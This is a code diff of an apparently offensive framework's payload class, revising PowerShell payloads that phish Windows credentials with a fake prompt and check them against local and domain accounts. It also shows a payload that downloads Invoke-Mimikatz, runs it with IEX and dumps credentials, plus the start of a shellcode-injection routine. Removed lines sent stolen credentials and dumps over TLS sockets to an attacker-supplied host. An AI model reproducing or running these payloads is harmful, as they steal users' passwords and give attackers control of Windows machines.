@@ -182,30 +182,20 @@ class SHELLCODE(object):
         "SendStrResponse $ssl $str;SendResponse $ssl $Bytes};$MemoryStream.Close()}catch{Exit}")
 
     windows_ps_ask_creds_tcp = (
-        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
-        "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
-        "$ssl.AuthenticateAsClient($env:computername);"
-        "$ErrorActionPreference=\"SilentlyContinue\";Add-Type -assemblyname system.DirectoryServices.accountmanagement;"
+        "$ErrorActionPreference=\'SilentlyContinue\';Add-Type -assemblyname system.DirectoryServices.accountmanagement;"
         "$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);"
-        "$domainDN = \"LDAP://\" + ([ADSI]\"\").distinguishedName;"
-        "while($true){$credential = $host.ui.PromptForCredential(\"Credentials are required to perform this operation!\", \"\", \"\", \"\");"
-        "if($credential){$creds = $credential.GetNetworkCredential();[String]$user = $creds.username;[String];$pass = $creds.password;"
-        "$send = ([text.encoding]::ASCII).GetBytes('>> INCORRECT -- ' + 'Username: ' + $user + ' Password: ' + $pass);"
-        "$ssl.Write($send,0,$send.Length);"
-        "[String]$domain = $creds.domain;$authlocal = $DS.ValidateCredentials($user, $pass);"
+        "$domainDN = \'LDAP://\' + ([ADSI]\'\').distinguishedName;"
+        "$credential = $host.ui.PromptForCredential(\'Credentials are required to perform this operation!\', \'\', \'\', \'\');"
+        "if($credential){$creds = $credential.GetNetworkCredential();$user = $creds.username;$pass = $creds.password;"
+        "echo \' INCORRECT:\'$user\':\'$pass;"
+        "$authlocal = $DS.ValidateCredentials($user, $pass);"
         "$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);"
         "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){"
-        "$send = ([text.encoding]::ASCII).GetBytes('>> CORRECT -- ' + 'Username: ' + $user + ' Password: ' + $pass);"
-        "$ssl.Write($send,0,$send.Length);Exit}}}")
+        "echo \' CORRECT:\'$user\':\'$pass}}")
 
     windows_invoke_mimikatz = (
-        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
-        "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
-        "$ssl.AuthenticateAsClient($env:computername);"
-        "IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\");"
-        "$o = (Invoke-Mimikatz -DumpCreds);"
-        "$send = ([text.encoding]::ASCII).GetBytes($o);"
-        "$ssl.Write($send,0,$send.Length);")
+        "IEX (New-Object Net.WebClient).DownloadString(\\\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\\\");"
+        "Invoke-Mimikatz -DumpCreds")
 
     injectwindows = """shellcode = bytearray('%s')
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
